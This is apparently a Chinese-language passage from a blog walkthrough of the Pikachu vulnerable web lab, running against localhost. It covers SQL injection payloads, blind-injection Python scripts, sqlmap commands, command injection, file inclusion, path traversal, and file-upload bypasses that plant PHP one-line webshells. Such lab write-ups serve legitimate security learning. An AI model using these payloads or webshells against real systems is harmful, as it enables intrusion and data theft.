alt="image-20221116195827914"></p><p>就是说我们在访问这个页面的时候就会自动生成一个新的token,那我们看一下这个token有什么规律呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成一个token,以当前微妙时间+一个5位的前缀</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    &#125; <span class="comment">//释放一个token并且生成一个</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">10000</span>,<span class="number">99999</span>),<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//uniqid生成一个唯一ID  逗号后的true是more_entropy如果设置为TRUE，uniqid() 会在返回的字符串结尾增加额外的熵（使用combined linear congruential generator）。使得唯一ID更具唯一性。</span></span><br><span class="line"><span class="comment">//mt_rand 随机数生成</span></span><br></pre></td></tr></table></figure><p>很明显这个token生成的没有任何规律,一直都在强调一个random</p><p>这题token写的很不错,我没有找到可以利用的方法,在网上看了很多大佬的wp,大部分是解释说这个token可以防止csrf,也有大佬说是这个token可以像上边<code>token防爆破?</code>那题一样去爆破token,但是仔细想一下我们怎么才能提前猜到被攻击者的token,我们所进行的爆破都是攻击者主动去爆破的,我们不能让受害者去主动爆破token,但是受害者不爆破token,我们又猜不到他的token,所以只能放弃.我想唯一的方法大概就是给受害者发一个爆破token的脚本让他执行,那我们为什么不直接留后门🤣</p><h3 id="Sql-Inject-SQL注入"><a href="#Sql-Inject-SQL注入" class="headerlink" title="Sql Inject(SQL注入)"></a>Sql Inject(SQL注入)</h3><blockquote><p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br><strong>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</strong><br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p><p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p><p>SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。<br>你可以通过“Sql Inject”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>post型,抓一下包,直接开打,两个回显位</p><p><code>1%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1</code><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171858597.png" alt="image-20221117185821480"></p><p>然后继续打<code>1%20union%20select%201%2C(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D&#39;users&#39;)%20limit%201%2C1</code><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171909147.png" alt="image-20221117190925083"></p><p>现在开始查他的内容<code>1%20union%20select%201%2C(select%20(group_concat(username%2Cpassword)))%20from%20users%20limit%201%2C1</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171908967.png" alt="image-20221117190846851"></p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>加了个单引号而已,通过＃注释,继续上一题的payload这里不再浪费时间</p><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>看见搜索框我们先来试一下xss<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171951801.png" alt="image-20221117195126764"></p><p>然后就拿到了sql语句后边是<code>%&#39;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>源码也确实如此,还是老套路继续打<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172014731.png" alt="image-20221117201425689"></p><h4 id="xxx型注入"><a href="#xxx型注入" class="headerlink" title="xxx型注入"></a>xxx型注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;</span><br></pre></td></tr></table></figure><p>只是换了种闭合方式,换汤不换药</p><h4 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h4><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172036791.png" alt="image-20221117203610725"></p><p>登陆界面是无法注入,我们注册登录一下,这里的报错注入是可以用的<code>&#39; or updatexml(1, concat(0x7e, database()), 0)#</code><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172115281.png" alt="image-20221117211543250"></p><p>详情可参考<a href="https://charmersix.icu/2022/10/01/web_5/">这篇</a>,这里不再重复</p><h4 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h4><p>这里删除发现没什么用,抓包一看原来注入点在这</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172121666.png" alt="image-20221117212128603"></p><p>拿下<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172122266.png" alt="image-20221117212259213"></p><h4 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h4><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172127264.png" alt="image-20221117212727228"></p><p>跟上边insert注入一样,就是换了换地方payload:<code>&#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172134774.png" alt="image-20221117213413700"></p><h4 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h4><p>首先用<code>kobe&#39; and length(database())&gt;10 #</code>判断出数据库名的长度</p><p>经过几次尝试我们可以拿到数据库长度为7</p><p>然后我们来个py脚本注一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        data = <span class="string">&quot;kobe&#x27;%20and%20if(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2C1%2C(select%20table_name%20from%20information_schema.tables))%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>.<span class="built_in">format</span>(i,u)</span><br><span class="line">        <span class="comment"># data=&#123;</span></span><br><span class="line">        <span class="comment"># &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),</span></span><br><span class="line">        <span class="comment"># &#125;</span></span><br><span class="line">        response = requests.get(url=url+data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;your uid:3&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据库名:&quot;</span>+user)</span><br></pre></td></tr></table></figure><p>也可以用bp爆破,抓包,然后发到intruder,然后打上我们的payload,设一下这两个位置<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182130146.png" alt="image-20221118213032092"></p><p>然后两个位置分别是数字和字母<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182131299.png"></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182132186.png" alt="image-20221118213208134"></p><p>这里的1-7就刚好是我们数据库的库名顺序</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182118528.png" alt="image-20221118211833411"></p><h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>同bool盲注,我们先判断数据库长度<code>kobe&#39; and if (length(database()) &gt; 5 ,sleep(5),null) #</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">&quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        prox= &#123;</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = <span class="string">&quot;kobe&#x27;%20and%20if%20(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2Csleep(5)%2Cnull)%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>.<span class="built_in">format</span>(i,u)</span><br><span class="line">        <span class="comment"># data=&#123;</span></span><br><span class="line">        <span class="comment"># &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),</span></span><br><span class="line">        <span class="comment"># &#125;</span></span><br><span class="line">        <span class="comment"># if &quot;your uid:3&quot; in response.text:</span></span><br><span class="line">        <span class="comment">#     user += u</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line"></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url=url + data,proxies=prox)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        t = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> t &gt; <span class="number">5</span>:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i)+<span class="built_in">format</span>(u))    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据库名:&quot;</span>+user)</span><br></pre></td></tr></table></figure><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><blockquote><p>宽字节注入指的是MySQL数据库在使用宽字节(GBK)编码时,会认为两个字符是一个汉字(前一个ASCII码要大于128(比如%df),才到汉字的范围),而当我们输入单引号时,MySQL会调用转义函数,将单引号变为<code>\&#39;</code>,其中的<code>\</code>的十六进制是<code>%5c</code>,MySQL的GBK编码,会认为<code>%df%5c</code>是一个宽字节,也就是<code>運</code>从而使单引号闭合,进行注入.</p><p>宽字节注入发生的位置就是php发送请求到MySQL时字符使用<code>character_set_client</code>设置值进行了一次编码,然后服务器会根据<code>character_set_connenction</code>把请求进行转码,从<code>character_set_client</code>转成<code>character_set_connection</code>,然后更新到数据库的时候,再转化成字段所对应的编码</p></blockquote><p>下述数据变化过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash"><span class="built_in">df</span>%27===&gt;(addslashes)====&gt;%<span class="built_in">df</span>%5c%27====&gt;(GBK)====&gt;運’</span></span><br><span class="line"></span><br><span class="line">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br></pre></td></tr></table></figure><p>payload:<code>name=kobe%20%df&#39;%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1#&amp;submit=%E6%9F%A5%E8%AF%A2</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211192156018.png" alt="image-20221119215647942"></p><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>我们再用sqlmap来一遍这个题目</p><h4 id="数字型注入-1"><a href="#数字型注入-1" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>这题是post型,我们先抓一个post的包</p><blockquote><p>POST /vul/sqli/sqli_id.php HTTP/1.1<br>Host: localhost<br>Content-Length: 29<br>Cache-Control: max-age=0<br>sec-ch-ua: “Chromium”;v=”95”, “;Not A Brand”;v=”99”<br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: “Windows”<br>Upgrade-Insecure-Requests: 1<br>Origin: <a class="link" target="_blank" rel="noopener" href="http://localhost/">http://localhost<i class="fas fa-external-link-alt"></i></a><br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Referer: <a class="link" target="_blank" rel="noopener" href="http://localhost/vul/sqli/sqli_id.php">http://localhost/vul/sqli/sqli_id.php<i class="fas fa-external-link-alt"></i></a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: PHPSESSID=70en5hdmaav0gib3anlocf62h7<br>Connection: close</p><p>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</p></blockquote><p><code>python .\sqlmap.py -r 1.txt -p id --dbs --batch</code></p><h4 id="字符型注入-1"><a href="#字符型注入-1" class="headerlink" title="字符型注入"></a>字符型注入</h4><p><code>python .\sqlmap.py -u http://localhost/vul/sqli/sqli_str.php?name=1&quot;&amp;submit=查询&quot; --dbs --batch</code></p><h4 id="搜索型注入-1"><a href="#搜索型注入-1" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p><code>python .\sqlmap.py -u http://localhost/vul/sqli/sqli_search.php?name=1&quot;&amp;submit=查询&quot; --dbs --batch</code></p><h4 id="xxx型注入-1"><a href="#xxx型注入-1" class="headerlink" title="xxx型注入"></a>xxx型注入</h4><p>同上,仍然可以打出</p><p><code>python .\sqlmap.py -u http://localhost/vul/sqli/sqli_x.php?name=1&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs --batch</code></p><h4 id="“insert-update”注入-1"><a href="#“insert-update”注入-1" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h4><p><code>python .\sqlmap.py -r 1.txt -p add --dbs --batch</code></p><h4 id="“delete”注入-1"><a href="#“delete”注入-1" class="headerlink" title="“delete”注入"></a>“delete”注入</h4><p>继续上述payload即可</p><h4 id="http头注入-1"><a href="#http头注入-1" class="headerlink" title="http头注入"></a>http头注入</h4><p><code>sqlmap --level</code> 有五个等级,默认为1,2是cookie注入,3是UA注入,4是refere注入,5是host注入,这里我们使用level3</p><p><code>python .\sqlmap.py -r 1.txt -p User-Agent --level 3 --batch --dbs</code></p><h4 id="基于boolian的盲注-1"><a href="#基于boolian的盲注-1" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h4><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><blockquote><p>RCE(remote command/code execute)概述</p><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p><strong>远程系统命令执行</strong><br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p><p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-</p><p><strong>远程代码执行</strong><br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p><p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><p>你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h4><p>这里应该是后端执行了shell ping命令,所以我们可以试一下<code>|</code>和`&amp;</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211200002146.png" alt="image-20221120000257034"></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211200003805.png" alt="image-20221120000301710"></p><p>都可以执行成功就直接相当于拿到了服务器shell</p><h4 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h4><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201613350.png" alt="image-20221120161324190"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><blockquote><p>File Inclusion(文件包含漏洞)概述</p><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。</p><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p><p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p><p>你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>我们在目录下新建个txt,一会通过web页面读它<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201629180.png" alt="image-20221120162939127"></p><p>然后我们直接在url里输入目录就可以<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201631389.png" alt="image-20221120163110337"></p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>这题没有把include写入源码里,需要我们在url里加上,当然也就给了我们一个远程利用的机会<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201641089.png" alt="image-20221120164145034"></p><p>我们在远程服务器写一个可以写文件的php语句,然后写上一句话木马,像这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php system($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201725347.png" alt="image-20221120172546281"></p><p>pikachu成功被我们上传一句话木马</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201737606.png" alt="image-20221120173709513"></p><p>上述方法很明显是非常繁杂的,那有没有什么简单粗暴的方法呢,当然有,上边<code>1.txt</code>是可以执行的,那我们把<code>1.txt</code>直接写成一句话木马不久可以了吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211242049874.png"></p><h3 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h3><blockquote><p>不安全的文件下载概述</p><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p><p>你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="不安全的文件下载-1"><a href="#不安全的文件下载-1" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h4><p>这里可以类比于文件包含,我们可以下载到自己想要的任何虚拟机文件,这里我采用两种方法第一种是bp抓包改包<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202011354.png" alt="image-20221120201053242"></p><p>第二种直接F12修改一下下载路径<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202011229.png" alt="image-20221120201134143"></p><h3 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h3><blockquote><p>不安全的文件上传漏洞概述</p><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</p><p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p><p>你可以通过“Unsafe file upload”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="客户端check"><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h4><p>这里可以简单理解成前端验证,然后JavaScript跳出来组织你上传,那我们只要把JavaScript禁用了就不会有任何东西阻止我们传马了,这里我在chrome store随便下载了<a class="link" target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/quick-javascript-switcher/geddoclleiomckbhadiaipdggiiccfje?hl=zh-CN">一个<i class="fas fa-external-link-alt"></i></a></p><p>然后就可以传上php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202114064.png" alt="image-20221120211443956"></p><p>蚁剑就可以连接了<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202117824.png" alt="image-20221120211738760"></p><h4 id="服务端check"><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h4><p>这里只是验证了<code>Content-Type</code>我们抓包改包就可以拿下还是利用上题的一句话木马就可以解决</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$type</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);<span class="comment">//指定类型</span></span><br><span class="line"><span class="variable">$mime</span>=<span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>,<span 